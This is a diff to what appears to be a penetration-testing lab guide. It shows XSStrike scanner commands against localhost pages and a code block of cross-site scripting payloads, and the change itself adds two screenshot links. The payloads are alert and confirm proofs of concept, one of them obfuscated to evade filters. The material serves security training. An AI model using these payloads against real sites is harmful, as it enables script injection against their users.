@@ -32,7 +32,11 @@ $ python3 xsstrike.py -u "http://localhost/index.php" --crawl
 $ python3 xsstrike.py -u "http://localhost/profile.php?nokp="
 ```
 
+![](https://github.com/gh1mau/vapt/blob/main/image/xsstrike_1.png "XXStrike")
 
+
+
+![](https://github.com/gh1mau/vapt/blob/main/image/xsstrike_2.png)
 
 ---
 
@@ -42,7 +46,9 @@ $ python3 xsstrike.py -u "http://localhost/profile.php?nokp="
 
 ```javascript
 =>"'><script>alert('gh1mau')</script>
+
 =%3E%22'%3E%3Cscript%3Ealert('gh1mau')%3C/script%3E 
+
 %22%3Cd3V%0dOnmouSEoVeR%09=%09confirm(%22gh1mau%22)%3E%3Ch1%3Egh1mau%3C/h1%3E
 ```
 
